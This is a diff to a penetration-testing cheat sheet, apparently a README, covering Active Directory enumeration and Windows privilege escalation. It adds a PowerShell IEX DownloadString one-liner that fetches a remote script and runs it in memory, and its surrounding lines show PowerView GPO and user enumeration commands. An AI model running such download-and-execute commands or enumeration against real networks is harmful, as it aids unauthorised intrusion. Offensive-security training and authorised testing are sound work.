@@ -28,6 +28,7 @@ Table of Contents
       * [List the AV excepcions](#list-the-av-excepcions)
       * [Impersonating user through delegation](#impersonating-user-through-delegation)
       * [Useful PowerView executions](#useful-powerview-executions)
+      * [Importing ActiveDirectory module](#importing-activedirectory-module)
    * [PrivEsc on Windows](#privesc-on-windows)
       * [Bypassing Windows Defender](#bypassing-windows-defender)
       * [Sharing files with Windows machine](#sharing-files-with-windows-machine)
@@ -255,6 +256,11 @@ Get-NetGPO | %{ if ($_.displayname -eq "__GPO_Name__") { $_.name }} | % {Get-Net
 
 # Enumerating the users affected by a scpecific GPO
 Get-NetGPO | %{ if ($_.displayname -eq "TestingGPO") { $_.name }} | % {Get-NetOU -GUID $_ } | % { Get-NetUser -ADSpath $_ }
+```
+## Importing ActiveDirectory module
+From internet:
+```powershell
+IEX (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory -Verbose
 ```
 
 # PrivEsc on Windows
